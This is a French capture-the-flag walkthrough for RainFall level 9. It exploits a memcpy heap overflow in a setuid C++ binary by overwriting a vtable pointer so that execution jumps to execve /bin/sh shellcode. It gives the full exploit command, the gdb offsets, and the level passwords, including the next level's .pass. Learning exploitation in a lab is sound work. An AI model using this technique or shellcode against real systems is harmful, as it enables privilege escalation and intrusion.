## Connexion et exploration

```bash
ssh level9@192.168.1.150 -p 4243
```
> Le mot de passe est : `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`

Une fois connecté, cet écran s'affiche : 
```
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level9/level9
```

informations sur le binaire a exploiter :
```bash
level9@RainFall:~$ ls -l level9
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
level9@RainFall:~$ file level9
level9: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xdda359aa790074668598f47d1ee04164f5b63afa, not stripped
```

L'execution :
```bash
level9@RainFall:~$ ./level9
level9@RainFall:~$ echo $?
1
level9@RainFall:~$ ./level9 test
level9@RainFall:~$ echo $?
11
# et un input tres long donne un segfault
# [...]
Segmentation fault (core dumped)
```
> biazrre ce comportement

Analysons le binaire `objdump -R level9` 
```bash
level9:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049b40 R_386_GLOB_DAT    __gmon_start__
08049b80 R_386_COPY        _ZTVN10__cxxabiv117__class_type_infoE
08049b50 R_386_JUMP_SLOT   __cxa_atexit
08049b54 R_386_JUMP_SLOT   __gmon_start__
08049b58 R_386_JUMP_SLOT   _ZNSt8ios_base4InitC1Ev
08049b5c R_386_JUMP_SLOT   __libc_start_main
08049b60 R_386_JUMP_SLOT   _exit
08049b64 R_386_JUMP_SLOT   _ZNSt8ios_base4InitD1Ev
08049b68 R_386_JUMP_SLOT   memcpy
08049b6c R_386_JUMP_SLOT   strlen
08049b70 R_386_JUMP_SLOT   _Znwj
```
[Resultat du objdump -d level9](./source/objdump.txt)  
[Resultat de la decompilation](./source/level9.cpp) avec [RetDec sur DogBolt](https://dogbolt.org/)


C'est du code C++, et on identifie deja : 
- deux objets C++ N(5) et N(6) côte à côte dans la stack  
- chaque objet contient :
  - un lien vers une vtable  
  - un buffer de taille fixe  
  - un nombre entier (5 ou 6)  
- quand on exec le programme avec un `argv`, il recopie sans limite `argv[1]` dans le buffer du premier objet (N(5))  
- si le texte est trop long : overflow et ecrasement de la vtable du deuxieme objet (N(6)), donc possible d'ecraser les pointeurs de fonctions  
- a la fin du main, la methode de la vtable de N(6) est appelee avec le 1er objet en argument  

Donc si on ecrase la vtable, on peut controler le flux d'execution  

Pour cette fois, nous allons donc utiliser `gdb`  

<br>

## Prise d'infos avec gdb

Lancement de gdb : 
```bash
gdb ./level9
```

On mets un breakpoint apres l'appel de `setAnnotation` dans le `main`
```gdb
break *0x0804867c
```

On lance le binaire avec un arg bidon (on verra apres)
```gdb
run AAAA
```

On arrive donc au breakpoint, on peut inspecte les objets  
```gdb
x/wx $esp+0x1c
0xbffff6fc:	0x0804a008

x/wx $esp+0x18
0xbffff6f8:	0x0804a078
```

Les deux adresses a retenir sont donc :
- obj1 à `0x0804a008`  
- obj2 à `0x0804a078`  

Chaque objet commence par un pointeur de vtable (4 octets), puis un buffer, puis un entier  
Quand on fait `memcpy(obj1 + 4, argv[1], strlen(argv[1]))`, la copie commence juste après la vtable de obj1 (à `0x0804a00c`)  
Pour écraser la vtable de obj2, il faut que notre chaîne soit assez longue pour remplir tout obj1 (de `0x0804a00c` à `0x0804a078`, soit 0x6c = 108 octets), puis écrire encore 4 octets (pour la vtable de obj2)  
Donc, il faut au moins 112 caractères dans argv[1] :  
- 108 pour remplir obj1  
- 4 pour écraser la vtable de obj2  

<br>

## Stratégie d'exploit 

1.	Mettre du shellcode dans le buffer de obj1 (sur le heap, exécutable car NX = disabled).
2.	Créer une fausse vtable dans ce même buffer, qui contient comme première entrée l’adresse du shellcode.
3.	Écraser le pointeur de vtable de obj2 avec l’adresse de cette fausse vtable.
4.	Quand le programme appelle la méthode virtuelle de obj2, il exécutera notre shellcode (un bon `/bin/sh` des familles)  


<br>

## Construction de l'exploit

0. D'abord, on crée le shellcode pour `/bin/sh` (merci [shell-storm.org](https://shell-storm.org/shellcode))  
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
```

1.	On place le shellcode au tout début du buffer du premier objet (`0x0804a00c`)  
C’est l’adresse où notre code sera exécuté  

2.	Un peu plus loin dans ce même buffer (offset +0x50), on place une fausse vtable  
Cette fausse vtable contient un seul pointeur : l’adresse du shellcode  

3.	Le buffer du premier objet fait 108 octets. On le remplit ainsi :
- un petit NOP sled + notre shellcode  (ici `\x90`) -> `"\x90"*16` puis le shellcode
- du padding jusqu’à l’offset `0x50` (adresse de la fausse vtable)  -> `"A"*39`  
- la fausse vtable (4 octets, pointeur vers shellcode) -> `"\x0c\xa0\x04\x08"` (qui est juste l'adresse `0x0804a00c` en little-endian)  
- du padding jusqu’à l’offset `0x6c` (108 octets) -> `"B"*24`  
- et enfin, on écrase la vtable du second objet avec l’adresse de la fausse vtable -> `"\x5c\xa0\x04\x08"` (adresse `0x0804a050` en little-endian)  

Lorsque la méthode virtuelle du second objet est appelée, le programme lit la fausse vtable et saute directement sur notre shellcode (exécution d’un `/bin/sh`)  

**La commande finale** assemble tout ça automatiquement :
```bash
./level9 "$(python -c 'print "\x90"*16 \
+ "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" \
+ "A"*39 \
+ "\x0c\xa0\x04\x08" \
+ "B"*24 \
+ "\x5c\xa0\x04\x08"')"
```

Magnifique, on a notre shell, plus qu'a faire le tour du proprietaire et prendre le `.pass`
```
$ whoami
bonus0
$ cd /home/user/bonus0
$ cat .pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
$
```

Le mot de passe est donc : `f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728`

<br>

## Pour reproduire l'attaque

1. Connexion en ssh au niveau 9
```bash
ssh level9@192.168.1.150 -p 4243
# mot de passe est : c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

2. Execution de l'exploit
```bash
./level9 "$(python -c 'print "\x90"*16 \
+ "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80" \
+ "A"*39 \
+ "\x0c\xa0\x04\x08" \
+ "B"*24 \
+ "\x5c\xa0\x04\x08"')"
```

3. Récupérer le `.pass`
```bash
whoami # spoiler: bonus0
cd /home/user/bonus0
cat .pass
# output : f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
